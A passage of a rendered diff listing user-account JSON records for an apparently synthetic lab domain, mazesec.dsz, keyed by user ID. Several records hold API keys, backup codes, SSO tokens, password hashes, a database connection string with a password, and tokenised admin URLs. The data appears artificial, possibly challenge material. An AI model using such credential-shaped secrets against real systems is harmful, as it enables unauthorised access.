-{&quot;api_key&quot;:&quot;sk_internal_811959240839&quot;,&quot;backup_codes&quot;:&quot;[\&quot;873826\&quot;, \&quot;222881\&quot;, \&quot;499022\&quot;, \&quot;408220\&quot;]&quot;,&quot;department&quot;:&quot;\u4eba\u529b\u8d44\u6e90\u90e8&quot;,&quot;display_name&quot;:&quot;Zhang Yi&quot;,&quot;email&quot;:&quot;zhangyi1226@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$7212395190469581&quot;,&quot;phone&quot;:&quot;13830045087&quot;,&quot;private_notes&quot;:&quot;API \u7f51\u5173\u7ba1\u7406\u540e\u53f0: https://admin.internal.1226.corp/token=726302371&quot;,&quot;role&quot;:&quot;hr&quot;,&quot;sso_token&quot;:&quot;sso_hr_1226_765523&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1226,&quot;username&quot;:&quot;zhangyi1226&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_811959240839<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>873826<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>222881<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>499022<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>408220<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4eba\u529b\u8d44\u6e90\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhang Yi<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhangyi1226@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$7</span>212395190469581<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13830045087<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>API \u7f51\u5173\u7ba1\u7406\u540e\u53f0: https://admin.internal.1226.corp/token=726302371<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>hr<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_hr_1226_765523<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1226,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhangyi1226<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 1335 ==
-{&quot;api_key&quot;:&quot;sk_internal_924543486034&quot;,&quot;backup_codes&quot;:&quot;[\&quot;831680\&quot;, \&quot;639540\&quot;, \&quot;977673\&quot;, \&quot;390600\&quot;]&quot;,&quot;department&quot;:&quot;\u8fd0\u7ef4\u90e8&quot;,&quot;display_name&quot;:&quot;Zhou Xin&quot;,&quot;email&quot;:&quot;zhouxin1335@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$9920196542542048&quot;,&quot;phone&quot;:&quot;13890468529&quot;,&quot;private_notes&quot;:&quot;\u6570\u636e\u5e93\u8fde\u63a5\u4e32: mysql://admin:DbP4ss1335@db1335.internal:3306&quot;,&quot;role&quot;:&quot;ops&quot;,&quot;sso_token&quot;:&quot;sso_ops_1335_697223&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1335,&quot;username&quot;:&quot;zhouxin1335&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_924543486034<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>831680<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>639540<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>977673<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>390600<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u8fd0\u7ef4\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhou Xin<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhouxin1335@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$9</span>920196542542048<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13890468529<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u6570\u636e\u5e93\u8fde\u63a5\u4e32: mysql://admin:DbP4ss1335@db1335.internal:3306<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>ops<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_ops_1335_697223<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1335,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhouxin1335<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 1595 ==
-{&quot;api_key&quot;:&quot;sk_internal_573115384412&quot;,&quot;backup_codes&quot;:&quot;[\&quot;541803\&quot;, \&quot;539378\&quot;, \&quot;851532\&quot;, \&quot;349340\&quot;]&quot;,&quot;department&quot;:&quot;\u7814\u53d1\u90e8&quot;,&quot;display_name&quot;:&quot;Huang Wei&quot;,&quot;email&quot;:&quot;huangwei1595@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$3746499262861690&quot;,&quot;phone&quot;:&quot;13840044318&quot;,&quot;private_notes&quot;:&quot;VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client1595.ovpn&quot;,&quot;role&quot;:&quot;developer&quot;,&quot;sso_token&quot;:&quot;sso_developer_1595_454267&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1595,&quot;username&quot;:&quot;huangwei1595&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_573115384412<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>541803<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>539378<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>851532<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>349340<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u7814\u53d1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Huang Wei<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>huangwei1595@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$3</span>746499262861690<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13840044318<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>VPN \u914d\u7f6e\u6587\u4ef6: /etc/openvpn/client1595.ovpn<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>developer<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_developer_1595_454267<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1595,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>huangwei1595<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 1818 ==
-{&quot;api_key&quot;:&quot;sk_internal_840623136473&quot;,&quot;backup_codes&quot;:&quot;[\&quot;709419\&quot;, \&quot;353364\&quot;, \&quot;664903\&quot;, \&quot;343165\&quot;]&quot;,&quot;department&quot;:&quot;\u8fd0\u7ef4\u90e8&quot;,&quot;display_name&quot;:&quot;Zhu Jun&quot;,&quot;email&quot;:&quot;zhujun1818@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$7614128357075414&quot;,&quot;phone&quot;:&quot;13847372344&quot;,&quot;private_notes&quot;:&quot;API \u7f51\u5173\u7ba1\u7406\u540e\u53f0: https://admin.internal.1818.corp/token=239851954&quot;,&quot;role&quot;:&quot;ops&quot;,&quot;sso_token&quot;:&quot;sso_ops_1818_875415&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1818,&quot;username&quot;:&quot;zhujun1818&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_840623136473<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>709419<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>353364<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>664903<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>343165<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u8fd0\u7ef4\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhu Jun<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhujun1818@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$7</span>614128357075414<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13847372344<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>API \u7f51\u5173\u7ba1\u7406\u540e\u53f0: https://admin.internal.1818.corp/token=239851954<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>ops<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_ops_1818_875415<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1818,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhujun1818<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 1954 ==
-{&quot;api_key&quot;:&quot;sk_internal_678689100421&quot;,&quot;backup_codes&quot;:&quot;[\&quot;827509\&quot;, \&quot;834495\&quot;, \&quot;759018\&quot;, \&quot;415709\&quot;]&quot;,&quot;department&quot;:&quot;\u8d22\u52a1\u90e8&quot;,&quot;display_name&quot;:&quot;Sun Dong&quot;,&quot;email&quot;:&quot;sundong1954@mazesec.dsz&quot;,&quot;has_secret&quot;:true,&quot;password_hash&quot;:&quot;$2b$12$1386953897523084&quot;,&quot;phone&quot;:&quot;13896823803&quot;,&quot;private_notes&quot;:&quot;\u4f01\u4e1a\u5fae\u4fe1 webhook: https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=321456147&quot;,&quot;role&quot;:&quot;finance&quot;,&quot;sso_token&quot;:&quot;sso_finance_1954_231228&quot;,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:1954,&quot;username&quot;:&quot;sundong1954&quot;,&quot;vpn_access&quot;:true}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sk_internal_678689100421<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-cce">\"</span>827509<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>834495<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>759018<span class="pl-cce">\"</span>, <span class="pl-cce">\"</span>415709<span class="pl-cce">\"</span>]<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u8d22\u52a1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Sun Dong<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sundong1954@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:true,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$2</span>b<span class="pl-smi">$1</span>2<span class="pl-smi">$1</span>386953897523084<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13896823803<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4f01\u4e1a\u5fae\u4fe1 webhook: https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=321456147<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>finance<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sso_finance_1954_231228<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:1954,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sundong1954<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:true}
 
 == 3931 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u5916\u5305\u56e2\u961f&quot;,&quot;display_name&quot;:&quot;Zhou Yang&quot;,&quot;email&quot;:&quot;zhouyang3931@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13824346569&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;contractor&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:3931,&quot;username&quot;:&quot;zhouyang3931&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u5916\u5305\u56e2\u961f<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhou Yang<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhouyang3931@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13824346569<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>contractor<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:3931,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhouyang3931<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 4257 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u8bbe\u8ba1\u90e8&quot;,&quot;display_name&quot;:&quot;Zhu Peng&quot;,&quot;email&quot;:&quot;zhupeng4257@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13885724593&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;design&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:4257,&quot;username&quot;:&quot;zhupeng4257&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u8bbe\u8ba1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Zhu Peng<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhupeng4257@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13885724593<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>design<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:4257,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>zhupeng4257<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 4526 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u9500\u552e\u90e8&quot;,&quot;display_name&quot;:&quot;Luo Jian&quot;,&quot;email&quot;:&quot;luojian4526@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13885424047&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;sales&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:4526,&quot;username&quot;:&quot;luojian4526&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u9500\u552e\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Luo Jian<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>luojian4526@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13885424047<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>sales<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:4526,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>luojian4526<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 4741 ==
-{&quot;api_key&quot;:null,&quot;backup_codes&quot;:null,&quot;department&quot;:&quot;\u4ea7\u54c1\u90e8&quot;,&quot;display_name&quot;:&quot;Luo Yi&quot;,&quot;email&quot;:&quot;luoyi4741@mazesec.dsz&quot;,&quot;has_secret&quot;:false,&quot;password_hash&quot;:null,&quot;phone&quot;:&quot;13846848018&quot;,&quot;private_notes&quot;:null,&quot;role&quot;:&quot;product&quot;,&quot;sso_token&quot;:null,&quot;status&quot;:&quot;active&quot;,&quot;uid&quot;:4741,&quot;username&quot;:&quot;luoyi4741&quot;,&quot;vpn_access&quot;:false}
+{<span class="pl-s"><span class="pl-pds">"</span>api_key<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>backup_codes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>department<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>\u4ea7\u54c1\u90e8<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>display_name<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>Luo Yi<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>email<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>luoyi4741@mazesec.dsz<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>has_secret<span class="pl-pds">"</span></span>:false,<span class="pl-s"><span class="pl-pds">"</span>password_hash<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>phone<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>13846848018<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>private_notes<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>role<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>product<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>sso_token<span class="pl-pds">"</span></span>:null,<span class="pl-s"><span class="pl-pds">"</span>status<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>active<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>uid<span class="pl-pds">"</span></span>:4741,<span class="pl-s"><span class="pl-pds">"</span>username<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>luoyi4741<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>vpn_access<span class="pl-pds">"</span></span>:false}
 
 == 4828 ==
